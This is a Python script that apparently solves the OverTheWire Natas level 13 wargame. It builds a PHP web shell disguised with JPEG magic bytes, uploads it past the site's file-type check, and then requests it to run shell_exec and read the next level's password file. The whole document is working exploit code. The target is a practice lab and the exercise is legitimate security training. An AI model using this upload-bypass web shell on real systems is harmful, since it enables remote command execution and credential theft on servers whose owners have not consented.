import re
import requests
from halo import Halo


def create_malicious_file():
    file = open("shell.php", "wb")
    file.write(b'\xFF\xD8\xFF\xE0' + b'<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>')
    file.close()

    return


def get_password_location(URL, session):
    files = {"uploadedfile": open("shell.php", "rb")}
    data = {"filename": "shell.php"}
    response = session.post(URL, data=data, files=files)
    filename_location = re.findall(r'(upload/[a-zA-Z\d]{10}\.php)', response.text)[0]
    password_location = URL + "/" + filename_location

    return password_location


def get_natas14_password(natas13_password):
    URL = "http://natas13.natas.labs.overthewire.org"
    spinner = Halo(text='The password for natas 14 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()

    session = requests.Session()
    session.auth = ("natas13", natas13_password)
    response = session.get(URL)
    create_malicious_file()
    password_location = get_password_location(URL, session)
    response = session.get(password_location)
    natas14_password = re.findall(r'([a-zA-Z\d]{32})', response.text)[0]

    spinner.succeed(text="The password for natas 14 is: " + natas14_password)

    return natas14_password


if __name__ == '__main__':
    natas13_password = ""  # Put here the password for natas13 here
    get_natas14_password(natas13_password)
